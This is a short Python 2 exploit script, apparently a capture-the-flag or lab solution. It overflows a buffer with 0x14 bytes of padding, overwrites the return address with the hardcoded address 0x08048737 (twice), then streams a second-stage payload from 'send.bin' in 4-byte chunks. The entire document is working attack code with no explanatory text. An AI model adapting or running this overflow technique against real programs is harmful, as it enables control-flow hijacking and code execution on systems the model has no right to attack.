#!/usr/bin/env python2
import sys
import struct

sys.stdout.write('a' * 0x14 + struct.pack("<I", 0x08048737) * 2)

raw_input()

f = open('send.bin', 'r').read()

for i in xrange(0, len(f), 4):
    sys.stdout.write(f[i:i+4])

